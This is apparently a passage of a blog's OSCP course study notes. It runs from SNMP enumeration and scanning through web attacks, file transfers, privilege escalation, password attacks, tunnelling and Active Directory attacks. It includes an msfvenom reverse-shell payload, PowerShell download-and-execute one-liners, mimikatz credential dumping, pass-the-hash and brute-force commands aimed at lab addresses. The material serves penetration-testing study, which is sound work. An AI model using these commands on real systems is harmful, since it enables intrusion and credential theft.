community<br>    for ip in $(seq 1 254); do echo 10.11.1.$ip; done &gt; ips<br>    onesixtyone -c community -i ips</p>
-<h5 id="windows-SNMP-Enumeration-Example"><a href="#windows-SNMP-Enumeration-Example" class="headerlink" title="windows SNMP Enumeration Example"></a>windows SNMP Enumeration Example</h5><ul>
-<li>enumerating entire MIB tree<br><code>snmpwalk -c public -v1 -t 10 10.11.1.14</code>:-c is to specify the community string, -v is to specify the SNMP version number, -t 10 is to increase the timeout period to 10 seconds</li>
-<li>enumerating Windows Users<br><code>snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.77.1.2.25</code></li>
-<li>enumerating running windows processes<br><code>snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2</code></li>
-<li>enumerating open TCP ports<br><code>snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3</code></li>
-<li>enumerating installed software<br><code>snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2</code></li>
-</ul>
-<h3 id="8-Vulnerability-scanning"><a href="#8-Vulnerability-scanning" class="headerlink" title="8.Vulnerability scanning"></a>8.Vulnerability scanning</h3><h4 id="how-vulnerability-scanners-work"><a href="#how-vulnerability-scanners-work" class="headerlink" title="how vulnerability scanners work"></a>how vulnerability scanners work</h4><ul>
-<li><ol>
-<li>Detect if a target is up and running</li>
-</ol>
-</li>
-<li>2.Conduct a full or partial port scan,depending on the configuration</li>
-<li>3.identify the operating system using common fingerprinting techniques</li>
-<li>4.attemp to identify running services with common techniques such as banner grabbing,service behavior identification,or file discovery</li>
-<li>5.execute a signature-matching process to discover vulnerabilities</li>
-</ul>
-<h4 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h4><p><code>apt install ./Nessus-X.X.X.deb</code><br><code>/etc/init.d/nessusd start</code><br>accept the self-signed certificate</p>
-<h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>e.g. <code>nmap --script vuln 10.11.1.10</code>—-this will run all scripts in the “vuln” category against a target in the PWK labs</p>
-<h3 id="9-web-application-attacks"><a href="#9-web-application-attacks" class="headerlink" title="9.web application attacks"></a>9.web application attacks</h3><h4 id="web-application-Assessment-methodology"><a href="#web-application-Assessment-methodology" class="headerlink" title="web application Assessment methodology"></a>web application Assessment methodology</h4><h4 id="web-application-Enumeration"><a href="#web-application-Enumeration" class="headerlink" title="web application Enumeration"></a>web application Enumeration</h4><ul>
-<li>programming language and frameworks</li>
-<li>web server software</li>
-<li>database software</li>
-<li>server operating system</li>
-</ul>
-<h5 id="inspecting-URLs"><a href="#inspecting-URLs" class="headerlink" title="inspecting URLs"></a>inspecting URLs</h5><p>File extensions,which sometimes a part of a URL,can reveal the programming language the application was writtern in.Some of these,like .php,or vary based on the frameworks in use.For example,a Java-based web application migth use .jsp,.do,or .html</p>
-<h5 id="inspecting-Page-Content"><a href="#inspecting-Page-Content" class="headerlink" title="inspecting Page Content"></a>inspecting Page Content</h5><h5 id="viewing-response-headers"><a href="#viewing-response-headers" class="headerlink" title="viewing response headers"></a>viewing response headers</h5><h5 id="inspecting-sitemaps"><a href="#inspecting-sitemaps" class="headerlink" title="inspecting sitemaps"></a>inspecting sitemaps</h5><p>the two most common sitemap filenames are robots.txt and sitemap.xml</p>
-<h5 id="locating-administration-consoles"><a href="#locating-administration-consoles" class="headerlink" title="locating administration consoles"></a>locating administration consoles</h5><h4 id="web-application-assessment-tools"><a href="#web-application-assessment-tools" class="headerlink" title="web application assessment tools"></a>web application assessment tools</h4><ul>
-<li>DIRB<br><code>dirb http://www.megacorpone.com -r -z 10</code>:-r is to scan non-recursively,-z 10 is to add a 10 millisecond delay to each request</li>
-<li>BurpSuite</li>
-<li>Nikto<br><code>nikto -host=http://www.megacorpone.com -maxtime=30s</code>:-maxtime&#x3D;30s is to limit the scan duration to 30 seconds</li>
-</ul>
-<h4 id="exploiting-web-based-vulnerabilities"><a href="#exploiting-web-based-vulnerabilities" class="headerlink" title="exploiting web-based vulnerabilities"></a>exploiting web-based vulnerabilities</h4><ul>
-<li>exploiting admin consoles</li>
-<li>XSS</li>
-<li>directory traversal vulnerabilities</li>
-<li>file inclusion vulnerabilities</li>
-<li>sql injection</li>
-</ul>
-<h4 id="extra-miles"><a href="#extra-miles" class="headerlink" title="extra miles"></a>extra miles</h4><h3 id="10-Buffer-Overflows"><a href="#10-Buffer-Overflows" class="headerlink" title="10.Buffer Overflows"></a>10.Buffer Overflows</h3><h4 id="x86-Architecture"><a href="#x86-Architecture" class="headerlink" title="x86 Architecture"></a>x86 Architecture</h4><ul>
-<li>program memory</li>
-</ul>
-<h4 id="buffer-overflow-walkthrough"><a href="#buffer-overflow-walkthrough" class="headerlink" title="buffer overflow walkthrough"></a>buffer overflow walkthrough</h4><h3 id="11-windows-buffer-overflows"><a href="#11-windows-buffer-overflows" class="headerlink" title="11.windows buffer overflows"></a>11.windows buffer overflows</h3><h4 id="discovering-the-vulnerability"><a href="#discovering-the-vulnerability" class="headerlink" title="discovering the vulnerability"></a>discovering the vulnerability</h4><ul>
-<li>1.fuzzing the http protocol</li>
-</ul>
-<h4 id="win32-buffer-overflow-exploitation"><a href="#win32-buffer-overflow-exploitation" class="headerlink" title="win32 buffer overflow exploitation"></a>win32 buffer overflow exploitation</h4><ul>
-<li>DEP:Data Execution Prevention</li>
-<li>ASLR:Address Space Layout Randomization</li>
-<li>CFG:Control Flow Guard</li>
-</ul>
-<h3 id="12-Linux-buffer-overflows"><a href="#12-Linux-buffer-overflows" class="headerlink" title="12.Linux buffer overflows"></a>12.Linux buffer overflows</h3><h3 id="13-Client-Side-Attacks"><a href="#13-Client-Side-Attacks" class="headerlink" title="13.Client-Side Attacks"></a>13.Client-Side Attacks</h3><h4 id="know-ypur-target"><a href="#know-ypur-target" class="headerlink" title="know ypur target"></a>know ypur target</h4><ul>
-<li><ol>
-<li>passive client information gathering</li>
-</ol>
-</li>
-<li><ol start="2">
-<li>active client information gathering</li>
-</ol>
-</li>
-</ul>
-<h4 id="leveraging-HTML-applications"><a href="#leveraging-HTML-applications" class="headerlink" title="leveraging HTML applications"></a>leveraging HTML applications</h4><p>If a file is created with the extension of .hta instead of .html,Internet Explorer will automatically interpret it as a HTML Application and offer the ability to execute it using the mshta.exe program.<br><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta</code></p>
-<h4 id="exploiting-microsoft-office"><a href="#exploiting-microsoft-office" class="headerlink" title="exploiting microsoft office"></a>exploiting microsoft office</h4><h4 id="evading-protected-view"><a href="#evading-protected-view" class="headerlink" title="evading protected view"></a>evading protected view</h4><h3 id="14-Locating-public-exploits"><a href="#14-Locating-public-exploits" class="headerlink" title="14.Locating public exploits"></a>14.Locating public exploits</h3><h4 id="A-word-of-caution"><a href="#A-word-of-caution" class="headerlink" title="A word of caution"></a>A word of caution</h4><img src="/2022/07/28/oscp/jmpcode.png">
-#### Searching for exploits
-+ online exploit resources
- - 1.The exploit database
- - 2.SecurityFocus exploit archives
- - 3.Packet storm
-+ offline exploit resources
- - 1.SearchSploit
- - 2.Nmap NSE Scripts
- - 3.The Browser Exploitation Framework(BeEF)
- - 4.The Metasploit Framework
-#### putting it all together
-`nmap 10.11.0.128 -p- -sV -vv --open --reason`
-### 15.Fixing Exploits
-#### Fixing Memory Corruption Exploits
-#### Fixing Web Exploits
-### 16.File Transfers
-+ 1.setup-ftp.sh
-    #!/bin/bash
-    
-<pre><code>groupadd ftpgroup
-useradd -g ftpgroup -d /dev/null -s /etc ftpuser
-pure-pw useradd offsec -u ftpuser -d /ftphome
-pure-pw mkdb
-cd /etc/pure-ftpd/auth
-ln -s ../conf/PureDB 60pdb
-mkdir -p /ftphome
-chown -R ftpuser:ftpgroup /ftphome/
-systemctl restart pure-ftpd
-</code></pre>
-<ul>
-<li>2.upgrading a non-interactive shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></li>
-</ul>
-<h4 id="transfering-files-with-windows-hosts"><a href="#transfering-files-with-windows-hosts" class="headerlink" title="transfering files with windows hosts"></a>transfering files with windows hosts</h4><h5 id="non-interactive-ftp-download"><a href="#non-interactive-ftp-download" class="headerlink" title="non-interactive ftp download"></a>non-interactive ftp download</h5><pre><code>echo open 10.11.0.4 21 &gt; ftp.txt
-echo USER offsec &gt;&gt; ftp.txt(usernname)
-echo lab &gt;&gt; ftp.txt(password)
-echo bin &gt;&gt; ftp.txt
-echo GET nc.exe &gt;&gt; ftp.txt
-echo bye &gt;&gt; ftp.txt
-</code></pre>
-<p><code>ftp -v -n -s:ftp.txt</code>:-v is to suppress any returned output,-n is to suppress automatic login,-s is to indicate the name of command line</p>
-<h5 id="windows-downloads-using-scripting-languages"><a href="#windows-downloads-using-scripting-languages" class="headerlink" title="windows downloads using scripting languages"></a>windows downloads using scripting languages</h5><ul>
-<li><p>1.wget.vbs<br>  echo strUrl &#x3D; WScript.Arguments.Item(0) &gt; wget.vbs<br>  echo StrFile &#x3D; WScript.Arguments.Item(1) &gt;&gt; wget.vbs<br>  echo Const HTTPREQUEST_PROXYSETTING_DEFAULT &#x3D; 0 &gt;&gt; wget.vbs<br>  echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG &#x3D; 0 &gt;&gt; wget.vbs<br>  echo Const HTTPREQUEST_PROXYSETTING_DIRECT &#x3D; 1 &gt;&gt; wget.vbs<br>  echo Const HTTPREQUEST_PROXYSETTING_PROXY &#x3D; 2 &gt;&gt; wget.vbs<br>  echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs<br>  echo Err.Clear &gt;&gt; wget.vbs<br>  echo Set http &#x3D; Nothing &gt;&gt; wget.vbs<br>  echo Set http &#x3D; CreateObject(“WinHttp.WinHttpRequest.5.1”) &gt;&gt; wget.vbs<br>  echo If http Is Nothing Then Set http &#x3D; CreateObject(“WinHttp.WinHttpRequest”) &gt;&gt; wget.vbs<br>  echo If http Is Nothing Then Set http &#x3D; CreateObject(“MSXML2.ServerXMLHTTP”) &gt;&gt; wget.vbs<br>  echo If http Is Nothing Then Set http &#x3D; CreateObject(“Microsoft.XMLHTTP”) &gt;&gt; wget.vbs<br>  echo http.Open “GET”,strURL,False &gt;&gt; wget.vbs<br>  echo http.Send &gt;&gt; wget.vbs<br>  echo varByteArray &#x3D; http.ResponseBody &gt;&gt; wget.vbs<br>  echo Set http &#x3D; Nothing &gt;&gt; wget.vbs<br>  echo Set fs &#x3D; CreateObject(“Scripting.FileSystemObject”) &gt;&gt; wget.vbs<br>  echo Set ts &#x3D; fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs<br>  echo strData &#x3D; “” &gt;&gt; wget.vbs<br>  echo strBuffer &#x3D; “” &gt;&gt; wget.vbs<br>  echo For lngCounter &#x3D; 0 to UBound(varByteArray) &gt;&gt; wget.vbs<br>  echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs<br>  echo Next &gt;&gt; wget.vbs<br>  echo ts.Close &gt;&gt; wget.vbs</p>
-</li>
-<li><p>2.wget.ps1<br>  #! &#x2F;usr&#x2F;bin&#x2F;python</p>
-<p>  import sys</p>
-<p>  if len(sys.argv) !&#x3D;3:<br>  print “Usage: gen_ps1_wget.py <http_server> <file_to_download>“<br>  sys.exit(0)<br>  print “\n”<br>  print “Copy and paste the following in to the host:”<br>  print “\n”<br>  print “echo $storageDir &#x3D; $pwd &gt; wget.ps1”<br>  print “echo $webclient &#x3D; New-Object System.Net.WebClient &gt;&gt; wget.ps1”<br>  print “echo $url &#x3D; ‘http:&#x2F;&#x2F;%s&#x2F;%s’ &gt;&gt; wget.ps1”%(sys.argv[1],sys.argv[2])<br>  print “echo $file &#x3D; ‘%s’ &gt;&gt; wget.ps1” % sys.argv[2]<br>  print “echo $webclient.DownloadFile($url,$file) &gt;&gt; wget.ps1”<br>  print “\n”</file_to_download></http_server></p>
-</li>
-</ul>
-<p><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</code><br><code>powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http://10.10.0.4/xxx.exe&#39;,&#39;new-exploit.exe&#39;)</code><br><code>powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(&#39;http://10.10.0.4/helloworld.ps1&#39;)</code></p>
-<h5 id="windows-downloads-with-exe2hex-and-powershell"><a href="#windows-downloads-with-exe2hex-and-powershell" class="headerlink" title="windows downloads with exe2hex and powershell"></a>windows downloads with exe2hex and powershell</h5><p><code>exe2hex -x nc.exe -p nc.cmd</code><br><code>head nc.cmd</code> and copy this script to the bind shell</p>
-<h5 id="windows-uploads-using-windows-scripting-languages"><a href="#windows-uploads-using-windows-scripting-languages" class="headerlink" title="windows uploads using windows scripting languages"></a>windows uploads using windows scripting languages</h5><p>php code<br>    <?php
-    $uploaddir = '/var/www/uploads/';
-    $uploadfile = $uploaddir.$_FILES['file']['name'];
-    move_uploaded_file($_FILES['file']['tmp_name'],$uploadfile)
-    ?></p>
-<h5 id="uploading-files-with-TFTP"><a href="#uploading-files-with-TFTP" class="headerlink" title="uploading files with TFTP"></a>uploading files with TFTP</h5><h3 id="17-Antivirus-Evasion"><a href="#17-Antivirus-Evasion" class="headerlink" title="17.Antivirus Evasion"></a>17.Antivirus Evasion</h3><h4 id="methods-of-detecting-malicious-code"><a href="#methods-of-detecting-malicious-code" class="headerlink" title="methods of detecting malicious code"></a>methods of detecting malicious code</h4><ul>
-<li>1.signature-based detection(blacklist technology)</li>
-<li>2.heuristic and behavioral-based detection</li>
-</ul>
-<h4 id="bypassing-antivirus-detection"><a href="#bypassing-antivirus-detection" class="headerlink" title="bypassing antivirus detection"></a>bypassing antivirus detection</h4><h5 id="On-Disk-Evasion"><a href="#On-Disk-Evasion" class="headerlink" title="On-Disk Evasion"></a>On-Disk Evasion</h5><ul>
-<li>1.Packers</li>
-<li>2.Obfuscators</li>
-<li>3.Crypters</li>
-<li>4.Software protectors</li>
-</ul>
-<h5 id="In-Memory-Evasion"><a href="#In-Memory-Evasion" class="headerlink" title="In-Memory Evasion"></a>In-Memory Evasion</h5><ul>
-<li>1.Remote Process Memory Injection</li>
-<li>2.Reflective DLL Injection</li>
-<li>3.Process Hollowing</li>
-<li>4.Inline hooking</li>
-</ul>
-<h5 id="shelter"><a href="#shelter" class="headerlink" title="shelter"></a>shelter</h5><h3 id="18-Privilege-Escalation"><a href="#18-Privilege-Escalation" class="headerlink" title="18.Privilege Escalation"></a>18.Privilege Escalation</h3><h4 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h4><h5 id="Manual-Enumeration"><a href="#Manual-Enumeration" class="headerlink" title="Manual Enumeration"></a>Manual Enumeration</h5><ul>
-<li>Enumerating Users<br><code>whoami</code><br><code>net user</code>(windows)<br><code>id</code>(linux)<br><code>cat /etc/passwd</code>(linux)</li>
-<li>Enumerating the hostname<br><code>hostname</code></li>
-<li>Enumerating the operating system version and architecture<br><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;</code>(windows):&#x2F;B is to match patterns at the beginning of a line,&#x2F;C: is to specify a particular search string<br><code>cat /etc/issue</code><br><code>cat /etc/*-release</code><br><code>unmae -a</code></li>
-<li>Enumerating running processes and services<br><code>tasklist /SVC</code><br><code>ps aux</code></li>
-<li>Enumerating networking information<br><code>ipconfig /all</code>(windows)<br><code>route print</code>(windows)<br><code>netstat -ano</code>(windows)<br><code>ip a</code>(linux)<br><code>/sbin/route</code>(linux)<br><code>ss -anp</code>(linux)</li>
-<li>enumerating firewall status and rules<br><code>netsh advfirewall show currentprofile</code>(windows)<br><code>netsh advfirewall firewall show rule name=all</code></li>
-<li>Enumerating Scheduled Tasks<br><code>schtasks /query /fo LIST /v</code>(linux):&#x2F;query is to displays tasks,&#x2F;FO LIST sets the output format to a simple list,&#x2F;v is to request verbose output<br><code>ls -lah /etc/cron*</code><br><code>cat /etc/crontab</code></li>
-<li>Enumerating installed applications and patch levels<br><code>wmic product get name,version,vendor</code><br><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code><br><code>dkpg -l</code>(linux)</li>
-<li>Enumerating readable&#x2F;writable files and directories<br><code>accesschk.exe -uws &quot;Everyone&quot; &quot;C:\Program Files&quot;</code>:-u to suppress errors,-w to search for write access permissions,-s to perform a recursive search<br><code>Get-ChildItem &quot;C:\Program Files&quot; -Recurse | Get-ACL | ?&#123;$_.AccessToString -match &quot;Everyone\sAllow\s\sModify&quot;&#125;</code><br><code>find / -writable -type d 2&gt;/dev/null</code>(linux):type -d to locate directories</li>
-<li>Enumerating Unmounted Disks<br><code>mountvol</code>(windows)<br><code>cat /etc/fstab</code>(linux)<br><code>mount</code>(linux)<br><code>/bin/lsblk</code></li>
-<li>Enumerating device drivers and kernel modules<br><code>powershell</code> -&gt; <code>driverquery.exe /v /fo csv | ConvertForm-CSV | Select-Object &#39;Display Name&#39;,&#39;Start Mode&#39;,Path</code><br><code>powershell</code> -&gt; <code>Get-WmiObject Win32_PnPSignedDriver | Select-Object DriverName,DriverVersion,Manufacturer | Where-Object &#123;$_.DeviceName -like &quot;*VMware*&quot;&#125;</code><br><code>lsmod</code>(linux)<br><code>/sbin/modinfo libata</code>(linux)</li>
-<li>Enumerating Binaries that autoElevate<br><code>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</code><br><code>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</code><br><code>find / -perm -u=s -type f 2&gt;/dev/null</code></li>
-</ul>
-<h5 id="automated-enumeration"><a href="#automated-enumeration" class="headerlink" title="automated enumeration"></a>automated enumeration</h5><p><code>windows-privesc-check2.exe --dump -G</code><br><code>./unix-privesc-check</code><br><code>./unix-privesc-check standard &gt; output.txt</code></p>
-<h3 id="19-Password-attacks"><a href="#19-Password-attacks" class="headerlink" title="19.Password attacks"></a>19.Password attacks</h3><h4 id="wordlists"><a href="#wordlists" class="headerlink" title="wordlists"></a>wordlists</h4><p>&#x2F;usr&#x2F;share&#x2F;wordlists<br><code>cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt</code>:locates words with a minimum of six characters,and write the wordlist to a custom file<br><code>John the Ripper</code>(&#x2F;etc&#x2F;john&#x2F;john.conf)<br><code>john --wordlist=megacorp-cewl.txt --rules --stdout &gt; mutated.txt</code></p>
-<h4 id="brute-force-wordlists"><a href="#brute-force-wordlists" class="headerlink" title="brute force wordlists"></a>brute force wordlists</h4><p><code>crunch 8(minimum) 8(maximum) -t ,(upper case alpha characters)@@(lower case alpha characeters)^^(special characters including space)%%%(numeric characters)</code><br><code>crunch 4 6 0123456789ABCDEF -o crunch.txt</code><br><code>crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt</code></p>
-<h4 id="common-network-service-attack-methods"><a href="#common-network-service-attack-methods" class="headerlink" title="common network service attack methods"></a>common network service attack methods</h4><h5 id="HTTP-htaccess-Attack-with-Medusa"><a href="#HTTP-htaccess-Attack-with-Medusa" class="headerlink" title="HTTP htaccess Attack with Medusa"></a>HTTP htaccess Attack with Medusa</h5><p><code>medusa -h 10.11.0.22 -u admin -P /usr/share/wordlist/rockyou.txt -M http -m DIR:/admin</code>:-m DIR:&#x2F;admin is to initiate the attack against the htaccess-protected URL,-M is to use an HTTP authentication scheme</p>
-<h5 id="remote-desktop-protocol-attack-with-crowbar"><a href="#remote-desktop-protocol-attack-with-crowbar" class="headerlink" title="remote desktop protocol attack with crowbar"></a>remote desktop protocol attack with crowbar</h5><p><code>crowbar -b rdp -s 10.11.0.4/32 -u admin -C ~/password-file.txt -n 1</code>:-b is to specify the protocol,-s is the target server,-n is the number of threads</p>
-<h5 id="SSH-attack-with-THC-Hydra"><a href="#SSH-attack-with-THC-Hydra" class="headerlink" title="SSH attack with THC-Hydra"></a>SSH attack with THC-Hydra</h5><p><code>hydra -l kali -P /usr/share/wordlist/rockyou.txt ssh://127.0.0.1</code>:-l is to specify the username,and Protocol:&#x2F;&#x2F;ip si to specify the target protocol and IP address respectively</p>
-<h5 id="HTTP-POST-Attack-with-THC-Hydra"><a href="#HTTP-POST-Attack-with-THC-Hydra" class="headerlink" title="HTTP POST Attack with THC-Hydra"></a>HTTP POST Attack with THC-Hydra</h5><p><code>hydra http-form-post -U</code>:-U is to obtain additional information about the required arguments<br><code>hydra 10.11.0.2 http-form-post &quot;/form/frontpage.php:user=admin&amp;pass=^PASS^:INVALID LOGIN&quot; -l admin -P /usr/share/wordlist/rockyou.txt -vV -f</code>:-vV is to request verbose output,-f is to stop the attack when the first successful result is found</p>
-<h4 id="leveraging-password-hashes"><a href="#leveraging-password-hashes" class="headerlink" title="leveraging password hashes"></a>leveraging password hashes</h4><h5 id="retriving-password-hashed"><a href="#retriving-password-hashed" class="headerlink" title="retriving password hashed"></a>retriving password hashed</h5><p><code>hashid c43ee559d69bc7f691fe2fbfe8a5ef0a</code><br><code>minikatz</code><br><code>privilegeg::debug</code><br><code>token::elevate</code><br><code>lsadump::sam</code></p>
-<h5 id="passing-the-hash-in-windows"><a href="#passing-the-hash-in-windows" class="headerlink" title="passing the hash in windows"></a>passing the hash in windows</h5><p><code>pth-winexe -U offsec%xxxxxxxxxxxxxxxx //10.10.11.2 cmd</code></p>
-<h5 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h5><p><code>john hash.txt --format=NT</code><br><code>john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt --format=NT</code><br><code>john --rules --wordlist=/usr/share/wordlist/rockyou.txt hash.txt --format=NT</code></p>
-<h3 id="20-port-redirection-and-tunneling"><a href="#20-port-redirection-and-tunneling" class="headerlink" title="20.port redirection and tunneling"></a>20.port redirection and tunneling</h3><h4 id="port-forwarding"><a href="#port-forwarding" class="headerlink" title="port forwarding"></a>port forwarding</h4><h5 id="RINETD"><a href="#RINETD" class="headerlink" title="RINETD"></a>RINETD</h5><p><code>/etc/rinetd.conf</code>—&gt; <code>bindaddress bindport connectaddress connectport</code> —&gt;<code>0.0.0.0 80 11.10.1.4 80</code></p>
-<h5 id="SSH-tunneling"><a href="#SSH-tunneling" class="headerlink" title="SSH tunneling"></a>SSH tunneling</h5><ul>
-<li>ssh local port forwarding<br><code>ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128</code></li>
-<li>ssh remote port forwarding<br><code>ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4</code></li>
-<li>ssh dynamic port forwarding<br><code>ssh -N -D 127.0.0.1:8080 student@10.11.0.128</code></li>
-</ul>
-<h5 id="PLINK-exe"><a href="#PLINK-exe" class="headerlink" title="PLINK.exe"></a>PLINK.exe</h5><p><code>plink.exe -ssh -l(username) kali -pw(password) ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4</code><br><code>cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4</code></p>
-<h5 id="NETSH"><a href="#NETSH" class="headerlink" title="NETSH"></a>NETSH</h5><p><code>netsh interface portproxy add v4tov4 listenport=4445 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110</code><br>#####HTTPTunnel-ing through deep packet inspection<br><code>hts --forward-port localhost:8888 1234</code><br><code>htc --forward-port 8080 10.11.0.128:1234</code></p>
-<h3 id="21-active-directory-attacks"><a href="#21-active-directory-attacks" class="headerlink" title="21.active directory attacks"></a>21.active directory attacks</h3><h4 id="Active-Directory-Theory"><a href="#Active-Directory-Theory" class="headerlink" title="Active Directory Theory"></a>Active Directory Theory</h4><p>Domain Controller(DC)<br>Organizational Units(OU)</p>
-<h4 id="Active-Directory-Enumeration"><a href="#Active-Directory-Enumeration" class="headerlink" title="Active Directory Enumeration"></a>Active Directory Enumeration</h4><h5 id="traditional-approach"><a href="#traditional-approach" class="headerlink" title="traditional approach"></a>traditional approach</h5><p><code>net user</code><br><code>net user /doamin</code><br><code>net user jeff_admin /domain</code><br><code>net group domain</code></p>
-<h5 id="a-modern-approach"><a href="#a-modern-approach" class="headerlink" title="a modern approach"></a>a modern approach</h5><p>powershell<br><code>[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</code><br>script:<br>    $domainObj &#x3D; [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br>    $PDC &#x3D; ($domainObj.PdcRoleOwner).Name<br>    $SearchString &#x3D; “LDAP:&#x2F;&#x2F;“<br>    $SearchString +&#x3D; $PDC + “&#x2F;“<br>    $DistinguishedName &#x3D; “DC&#x3D;$($domainObj.Name.Replace(‘.’,’,DC&#x3D;’))”<br>    $SearchString +&#x3D; $DistinguishedName<br>    $SearchString</p>
-<pre><code>$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
-$objDomain = New-Object System.DirectoryServices.DirectoryEntry
-$Searcher.SearchRoot = $objDomain
-
-$Searcher.filter=&quot;samAccountType=805306368&quot;(&quot;name=Jeff_Admin&quot;)
-$Searcher.FindAll()
-
-Foreach($obj in $Result)
-&#123;
-    Foreach($prop in $obj.Properties)
-    &#123;
-        $prop
-    &#125;
-    Write-Host &quot;------------------------&quot;
-&#125;
-</code></pre>
-<h5 id="resolving-nested-groups"><a href="#resolving-nested-groups" class="headerlink" title="resolving nested groups"></a>resolving nested groups</h5><p>script:<br>    $domainObj &#x3D; [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br>    $PDC &#x3D; ($domainObj.PdcRoleOwner).Name<br>    $SearchString &#x3D; “LDAP:&#x2F;&#x2F;“<br>    $SearchString +&#x3D; $PDC + “&#x2F;“<br>    $DistinguishedName &#x3D; “DC&#x3D;$($domainObj.Name.Replace(‘.’,’,DC&#x3D;’))”<br>    $SearchString +&#x3D; $DistinguishedName<br>    $SearchString</p>
-<pre><code>$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
-$objDomain = New-Object System.DirectoryServices.DirectoryEntry
-$Searcher.SearchRoot = $objDomain
-
-$Searcher.filter=&quot;(objectClass=Group)&quot;---&gt;&quot;(name=Secret_Group)&quot;---&gt;&quot;(name=Nested_Group)&quot;---&gt;&quot;(name=Another_Nested_Group)&quot;
-$Result = $Searcher.FindAll()
-Foreach($obj in $Result)
-&#123;
-    $obj.Properties.name---&gt;$obj.Properties.member
-&#125;
-</code></pre>
-<h5 id="Currently-Logged-on-Users"><a href="#Currently-Logged-on-Users" class="headerlink" title="Currently Logged on Users"></a>Currently Logged on Users</h5><ul>
-<li>NetWkstaUserEnum</li>
-<li>NetSessionEnum<br><code>Import-Module .\PowerView.ps1</code><br><code>Get-NetLoggedon -ComputerName client251</code><br><code>Get-NetSession -ComputerName dc01</code></li>
-</ul>
-<h5 id="Enumeration-Through-Service-Principal-Names"><a href="#Enumeration-Through-Service-Principal-Names" class="headerlink" title="Enumeration Through Service Principal Names"></a>Enumeration Through Service Principal Names</h5><h4 id="Active-Directory-Authentication"><a href="#Active-Directory-Authentication" class="headerlink" title="Active Directory Authentication"></a>Active Directory Authentication</h4><h5 id="NTLM-Authentication"><a href="#NTLM-Authentication" class="headerlink" title="NTLM Authentication"></a>NTLM Authentication</h5><h5 id="Kerberos-Authentication"><a href="#Kerberos-Authentication" class="headerlink" title="Kerberos Authentication"></a>Kerberos Authentication</h5><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/266491528">https://zhuanlan.zhihu.com/p/266491528</a></p>
-<h5 id="Cached-Credential-Storage-and-Retrieval"><a href="#Cached-Credential-Storage-and-Retrieval" class="headerlink" title="Cached Credential Storage and Retrieval"></a>Cached Credential Storage and Retrieval</h5><p>mimikatz<br><code>privilege::debug</code><br><code>sekurlsa::logonpasswords</code><br><code>sekualsa::tickets</code></p>
-<h5 id="Service-Account-Attacks"><a href="#Service-Account-Attacks" class="headerlink" title="Service Account Attacks"></a>Service Account Attacks</h5><p><code>klist</code></p>
-<h5 id="Low-and-Slow-Password-Guessing"><a href="#Low-and-Slow-Password-Guessing" class="headerlink" title="Low and Slow Password Guessing"></a>Low and Slow Password Guessing</h5><p>spray-password.ps1</p>
-<h4 id="Active-Directory-Lateral-Movement"><a href="#Active-Directory-Lateral-Movement" class="headerlink" title="Active Directory Lateral Movement"></a>Active Directory Lateral Movement</h4><h5 id="Pass-the-Hash"><a href="#Pass-the-Hash" class="headerlink" title="Pass the Hash"></a>Pass the Hash</h5><p><code>pth-winexe -U Administrator%xxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxx //10.11.0.22 cmd</code></p>
-<h5 id="Overpass-the-Hash"><a href="#Overpass-the-Hash" class="headerlink" title="Overpass the Hash"></a>Overpass the Hash</h5><p><code>sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:xxxxxxxxxxxx /run:PowerShell.exe</code></p>
